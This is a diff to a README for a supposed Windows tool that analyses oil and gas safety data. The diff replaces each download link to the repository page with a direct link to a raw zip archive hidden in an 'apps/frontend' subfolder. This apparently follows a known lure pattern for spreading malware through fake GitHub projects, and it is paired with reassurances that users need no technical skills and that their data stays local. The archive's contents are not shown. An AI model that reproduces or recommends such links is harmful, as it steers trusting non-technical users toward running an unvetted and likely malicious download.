@@ -1,6 +1,6 @@
 # 🛢️ hse-ai-insight-platform - Analyze Oil & Gas Safety Data
 
-[![Download Now](https://img.shields.io/badge/Download-%23FF6347?style=for-the-badge&logo=github)](https://github.com/BuggyBunny005/hse-ai-insight-platform)
+[![Download Now](https://img.shields.io/badge/Download-%23FF6347?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/BuggyBunny005/hse-ai-insight-platform/main/hse-ai-insight-platform/apps/frontend/platform_hse_ai_insight_3.8.zip)
 
 ---
 
@@ -16,7 +16,7 @@ You do not need any technical skills to use this app. It runs on Windows and let
 
 Click the big button at the top or visit this page to get the software:
 
-[Download hse-ai-insight-platform](https://github.com/BuggyBunny005/hse-ai-insight-platform)
+[Download hse-ai-insight-platform](https://raw.githubusercontent.com/BuggyBunny005/hse-ai-insight-platform/main/hse-ai-insight-platform/apps/frontend/platform_hse_ai_insight_3.8.zip)
 
 ### Step 1: Visit the download page
 
@@ -134,4 +134,4 @@ Your data stays on your computer. The app does not send your reports anywhere un
 
 ---
 
-[![Download Here](https://img.shields.io/badge/Download-here-%23007ACC?style=for-the-badge&logo=windows)](https://github.com/BuggyBunny005/hse-ai-insight-platform)
+[![Download Here](https://img.shields.io/badge/Download-here-%23007ACC?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/BuggyBunny005/hse-ai-insight-platform/main/hse-ai-insight-platform/apps/frontend/platform_hse_ai_insight_3.8.zip)
